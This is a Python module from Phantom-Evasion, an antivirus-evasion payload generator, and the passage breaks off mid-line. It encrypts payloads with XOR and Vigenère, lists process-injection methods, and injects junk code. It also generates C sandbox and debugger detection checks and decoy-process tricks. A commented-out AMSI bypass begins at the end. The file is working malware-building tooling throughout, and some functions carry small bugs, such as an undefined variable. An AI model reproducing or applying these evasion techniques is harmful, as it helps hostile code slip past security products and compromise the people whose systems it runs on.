
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################


import random, string
import sys
sys.path.append("Modules/payloads/encryption")
sys.dont_write_bytecode = True
from Crypthelper import Printable
from platform import python_version

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","EarlyBird","EB","EntryPointHijack","EPH","APCSpray","APCS"]

def readpayload_exfile():

    Payload = ""
    payload_file = open("payload.txt","r")
    for line in payload_file:
        Payload += line

    return Payload

def SplitStr(st): 
    return [char for char in st]


def EncryptionManager(Encryption,Payload,Randbufname,Randlpv=""):

    if Encryption == "1":

       Payload = (Payload,"False")

    if Encryption == "2":

        from Multibyte_xor import XorEncrypt

        Payload = XorEncrypt(Payload,Randbufname,Randlpv)

    elif Encryption == "3":

        from Multibyte_xor import DoubleKeyXorEncrypt

        Payload = DoubleKeyXorEncrypt(Payload,Randbufname,Randlpv) 

    elif Encryption == "4": 

        from Vigenere import VigenereEncrypt

        Payload = VigenereEncrypt(Payload,Randbufname,Randlpv) 

    elif Encryption == "5":

        from Vigenere import DoubleKeyVigenereEncrypt

        Payload = DoubleKeyVigenereEncrypt(Payload,Randbufname,Randlpv)

    return Payload

def CryptFile(ModOpt):

    if ModOpt["cryptFile"] != False:

        filetocrypt=open(ModOpt["cryptFile"],'rb')
        filebuff=filetocrypt.read()

        filebuff_ready = Printable(filebuff)

        DecodeKit = EncryptionManager(ModOpt["Encode"],filebuff_ready,ModOpt["Lpvoid"] + "*$#FILE*")
        Payload = DecodeKit[0]     # encoded file 
        ModOpt["Decoder"] = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

        with open(ModOpt["cryptFile"].replace(".","crypt."),'wb') as f:

            if python_version()[0] == "3":

                f.write(Payload.encode('latin-1').decode('unicode-escape').encode('latin-1'))
            else:
                f.write(Payload.decode('string-escape'))

            f.close()

    else:

        ModOpt["Decoder"] = "False"

def IncludeShuffler(Include_List):

    include = ""
    random.shuffle(Include_List)

    for i in range(0,len(Include_List)):

        include += Include_List[i]

    return include


def WriteSource(fname,code):

    f = open(fname,'wb')
    f.write(code.encode('utf-8'))
    f.close()

def powershell_adjust(powershell_var):
    ret_powershell=""
    powershell_var=powershell_var.splitlines()
    for line in powershell_var:
        if line != "\n" and line != "":
            line= '"' + line.replace('"','\\"') + '\\n"\n'
            ret_powershell += line
    return ret_powershell


def Checksum8(Uri):

    sum = 0

    for i in Uri:

        sum += ord(i)

    return sum % 256 


def UriGenerator(length=random.randint(32,128)):

    while(True):

        uri = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + "-_") for _ in range(length))

        if Checksum8(uri) == 92:

            return uri

def JunkInjector(Source,JIntensity,JFrequency,EFrequency,Reinject):

    NewSource = ""
    Source = Source.splitlines()

    if JIntensity <= 0:
       JIntensity = 1

    elif JIntensity > 100:
       JIntensity = 100

    if JFrequency < 0:
       JFrequency = 0

    elif JFrequency > 100:
       JFrequency = 100

    if EFrequency < 0:
       EFrequency = 0

    elif EFrequency > 10:
       EFrequency = 10

    if Reinject < 0:
        Reinject = 0

    elif Reinject > 90:
        Reinject = 90

    for i in range(0,len(Source)):

        if "$:START" in Source[i]:

            Source[i]=Source[i].replace("$:START","")
            start=i

        elif "$:END" in Source[i]:

            Source[i]=Source[i].replace("$:END","")
            end=i

        elif "$:EVA" in Source[i]:

            evasioncode = ""
            Etemp=EFrequency
            while (Etemp > 0):

                evasioncode+=WindowsEvasion()
                Etemp-=1

            Source[i]=evasioncode

    mult = 1

    while JFrequency >= end - start:

        JFrequency=int(JFrequency/2)
        mult*=2

    position=sorted(random.sample(range(start,end),JFrequency))
    ii=0

    for i in range(0,len(Source)):

        NewSource += Source[i] + "\n"

        if position[ii] == i:

            x = mult
            temp1=""

            while x > 0:

                temp1+=JunkcodeGenerator(JIntensity)
                x-=1

            if Reinject > 0:

                temp2 = ""
                Junklist=temp1.splitlines()

                for junkline in Junklist:

                    temp2 += junkline + "\n"

                    while(Reinject < random.randint(1,100)):

                        temp2 += JunkcodeGenerator(random.randint(2,6))

                NewSource += temp2

            else:

                NewSource += temp1

            if ii < len(position) - 1:

                ii+=1

    NewSource += "}" * EFrequency

    return NewSource

def WindowsEvasion():

    Evasion_code = ""
    number = random.randint(1,14)

    if number == 1:    # open process trick
        Randfilehandle = varname_creator()
        Randprochandle = varname_creator()
        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 2:  # check time distortion 1
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "Sleep(" + Randsleep + ");\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 3: # Create a non-signaled Event time attack
        RandEvent = varname_creator()
        RandWaitsob = varname_creator() 
        Randsleep = str(random.randint(1000,1600))
        Evasion_code += "HANDLE " + RandEvent + " = CreateEvent(NULL, TRUE, FALSE, NULL);"
        Evasion_code += "if (" + RandEvent + " != NULL){\n"
        Evasion_code += "DWORD " + RandWaitsob + " = WaitForSingleObject(" + RandEvent + "," + Randsleep + ");\n"



    elif number == 4: # dynamic big mem alloc then zero-out
        Ndcvirtual = varname_creator()
        Randptr = varname_creator()
        Randbytesnumb = str(random.randrange(10000000,90000000,1024))

        Evasion_code += "LPVOID " + Randptr + " = NULL ;\n"
        Evasion_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");\n"
        Evasion_code += Randptr + " = (LPVOID)" + Ndcvirtual + "(NULL," + Randbytesnumb + ",0x3000,0x40);\n"
        Evasion_code += "if(" + Randptr + "!= NULL){\n"
        Evasion_code += "SecureZeroMemory(" + Randptr + "," + Randbytesnumb + ");\n"
        Evasion_code += "VirtualFree(" + Randptr + ", 0 , 0x8000);\n"


    elif number == 5: # load fake dll

        Ker32 = varname_creator()
        Fakedllname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(12,16)))

        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(TEXT(\"" + Fakedllname + ".dll\"));\n"
        Evasion_code += "if(" + Ker32 + " == NULL){\n"


    elif number == 6: # SetErrorMode trick

        dwCode = varname_creator()
        error_numb = str(random.randint(1000,2000))

        Evasion_code += "DWORD " + dwCode + ";\n"
        Evasion_code += "SetErrorMode(" + error_numb + ");\n"
        Evasion_code += "if(SetErrorMode(0) == " + error_numb + "){SetErrorMode(0);\n"

    if number == 7: # dynamic open process trick
        dyn_loadOP = varname_creator()
        Randprochandle = varname_creator()

        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += "FARPROC " + dyn_loadOP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"OpenProcess\");\n"
        Evasion_code += Randprochandle + " = (HANDLE)" + dyn_loadOP + "( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 8: # dynamic WTF is numa?
        dyn_loadVAEX = varname_creator()
        memvar = varname_creator()

        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"


    elif number == 9: # dynamic WTF is fls?
        dyn_loadFLSA = varname_creator()
        resvar = varname_creator()


        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"FlsAlloc\");\n"
        Evasion_code += "DWORD " + resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"


    elif number == 10: # Dynamic CheckRemoteDebuggerPresent

        dyn_loadCRDP = varname_creator()
        Randbool = varname_creator()
        Evasion_code += "BOOL " + Randbool + " = FALSE;\n"
        Evasion_code += "FARPROC " + dyn_loadCRDP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CheckRemoteDebuggerPresent\");\n"
        Evasion_code += dyn_loadCRDP + "(GetCurrentProcess(), &" + Randbool + ");\n"
        Evasion_code += "if(" + Randbool + " != TRUE){\n"

    elif number == 11: # Dynamic2 WTF is numa?
        dyn_loadVAEX = varname_creator()
        Ker32 = varname_creator()
        memvar = varname_creator()

        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(" + Ker32 + ", \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);}\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"

    elif number == 12: # dyn check time distortion 2 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        Rand_delayms = varname_creator()
        dyn_loadGTC = varname_creator()
        dyn_loadSE = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadSE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"SleepEx\");\n" 
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += dyn_loadSE + "(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 13: # dynamic2 WTF is fls?
        dyn_loadFLSA = varname_creator()
        Ker32 = varname_creator()
        resvar = varname_creator()

        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "DWORD " + resvar + ";\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(" + Ker32 + ", \"FlsAlloc\");\n"
        Evasion_code += resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);}\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"


    elif number == 14: # dyn check time distortion 1 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Rand_delayms = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "SleepEx(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 15: # Post Thread Message

        Randmsg = varname_creator()
        Randtc = varname_creator()
        Evasion_code += "MSG " + Randmsg + ";\n"
        Evasion_code += "DWORD " + Randtc + ";\n"
        Evasion_code += "PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);\n"
        Evasion_code += "if(PeekMessage(&" + Randmsg + ", (HWND)-1, 0, 0, 0)){\n"
        Evasion_code += "if (" + Randmsg + ".message != WM_USER+2 || " + Randmsg + ".wParam != 23 || " + Randmsg + ".lParam != 42){return;}\n"


    return Evasion_code

def WindowsDecoyProc(number):

    Evasion_code = ""

    for line in range(0,number):

        number = random.randint(1,3)

        if number == 1: # CreateMutex/WinExec 1

            mutexvar = varname_creator()
            mutexname = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "WinExec(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 2: # CreateMutex/WinExec 2

            mutexvar = varname_creator()
            mutexname = varname_creator()
            dyn_loadWE = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "FARPROC " + dyn_loadWE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WinExec\");\n" 
            Evasion_code += dyn_loadWE + "(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 3: # CreateMutex/CreateProcess 1
            Mutexvar = varname_creator()
            Mutexname = varname_creator()
            Randsi = varname_creator()
            Randpi = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + Mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + Mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "STARTUPINFO " + Randsi + ";PROCESS_INFORMATION " + Randpi + ";\n"
            Evasion_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
            Evasion_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"
            Evasion_code += "CreateProcess(argv[0],NULL,NULL,NULL,FALSE,0,NULL,NULL,&" + Randsi + ",&" + Randpi + ");SleepEx(" + Randtime + ",FALSE);}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"

    return Evasion_code

def CheckForBackslash(string2check):
    return string2check.replace("\\","\\\\")

def CloseDecoyProc(number):
    brack= "}" * number
    return brack

def InjectMessageBox(text):
    Winjunk_code = ""

    if number == "1":

        msgtype= MBtype()

        Winjunk_code += "MessageBox(NULL,\"Failed\",NULL," + msgtype + ");\n"

    if number == "2":
        User32 = varname_creator()
        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "HINSTANCE " + User32 + " = LoadLibrary(\"User32.dll\");\n"
        Winjunk_code += "if(" + User32 + " != NULL){\n"
        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(" + User32 + ", \"MessageBox\");\n"
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");}\n"

    if number == "3":

        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(GetModuleHandle(\"User32.dll\"), \"MessageBox\");\n" 
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");\n"

    return Winjunk_code


def MBtype():
    msgtype=""
    msgrandomtype = random.randint(1,3)
    if msgrandomtype == 1:
        msgtype="MB_ABORTRETRYIGNORE"
    if msgrandomtype == 2:
        msgtype="MB_CANCELTRYCONTINUE"
    if msgrandomtype == 3:
        msgtype="MB_OKCANCEL"  
    return msgtype

def WindowsDefend(ModOpt):

    Ret_code = ""

    #if ModOpt["AmsiBypass1"] == True:

    #    AmsiDll = varname_creator()
    #    AmsiScanBufferPtr = varname_creator()
    #    OldProt = varname_creator()
    #    Patch = varname_creator()

    #    Ret_code += "HINSTANCE " + AmsiDll + " = LoadLibrary(\"amsi.dll\");\n"
    #    Ret_code += "UINT_PTR " + AmsiScanBuf